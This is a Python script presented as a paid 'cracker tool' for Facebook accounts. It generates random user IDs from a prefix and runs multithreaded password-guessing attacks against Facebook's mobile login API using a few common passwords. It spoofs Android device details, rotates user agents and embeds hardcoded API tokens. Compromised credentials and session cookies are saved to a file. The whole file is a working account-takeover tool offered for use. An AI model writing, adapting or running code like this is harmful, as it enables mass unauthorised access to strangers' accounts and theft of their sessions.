# asim_cracker_win.py
import os
import sys
import time
import random
import uuid
import json
import urllib.parse
import base64
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from string import digits, ascii_letters

# Color-less minimal banner for Windows

def banner():
    print("""
    --------------------------------------
           ALPHA-X ZONE CRACKER TOOL
    --------------------------------------
    Creator     : Likhon
    Version     : 0.2
    Access      : PAID
    --------------------------------------
    """)

# Simulated device info for Windows (can't use getprop)

device = {
    'android_version': '13',
    'model': 'SM-A127F',
    'build': 'SP1A.210812.016',
    'fblc': 'en_GB',
    'fbmf': 'Samsung',
    'fbbd': 'Samsung',
    'fbdv': 'SM-A127F',
    'fbsv': '13',
    'fbca': 'arm64-v8a',
    'fbdm': '{density=2.0,height=2400,width=1080}'
}

# Generate random user-agent

def generate_user_agent():
    chrome_version = f"{random.randint(100, 150)}.0.0.0"
    return (
        f"Mozilla/5.0 (Linux; Android {device['fbsv']}; {device['model']}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} "
        f"Mobile Safari/537.36"
    )

# Cracker class

class ASIMCracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.user_agents = [generate_user_agent() for _ in range(50)]

    def execute_breach(self, prefix, limit):
        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678']

        with tred(max_workers=20) as executor:
            print(f"[*] Starting attack on {len(targets)} targets...")
            for target in targets:
                executor.submit(self.breach_target, target, passlist)

        self.display_results()

    def breach_target(self, uid, passlist):
        self.loop += 1
        for password in passlist:
            if self.try_breach(uid, password):
                break

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)
            headers = {
                'User-Agent': ua,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            payload = {
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'json',
                'generate_session_cookies': '1',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }

            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            header_list = [f"{k}: {v}" for k, v in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)
            c.setopt(c.TIMEOUT, 10)
            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            c.close()

            response = json.loads(response_body)

            if 'session_key' in response:
                self.save_result(uid, password, response, True)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.save_result(uid, password, response, False)
                return True
        except:
            pass
        return False

    def save_result(self, uid, password, response, success):
        filename = 'asim_old_results.txt'
        with open(filename, 'a') as f:
            if success:
                coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
                f.write(f"{uid}|{password}|{coki}\n")
                print(f"[OK] {uid} | {password}")
                self.oks.append(uid)
            else:
                f.write(f"{uid}|{password}\n")
                print(f"[CP] {uid} | {password}")
                self.cps.append(uid)

    def display_results(self):
        print("\n====================")
        print(f"OK: {len(self.oks)} | CP: {len(self.cps)}")
        print("Saved in: asim_old_results.txt")


if __name__ == '__main__':
    banner()
    prefix = input("Enter UID prefix (e.g. 100000): ")
    try:
        limit = int(input("Enter number of targets: "))
    except:
        print("Invalid input.")
        sys.exit(1)
    cracker = ASIMCracker()
    cracker.execute_breach(prefix, limit)
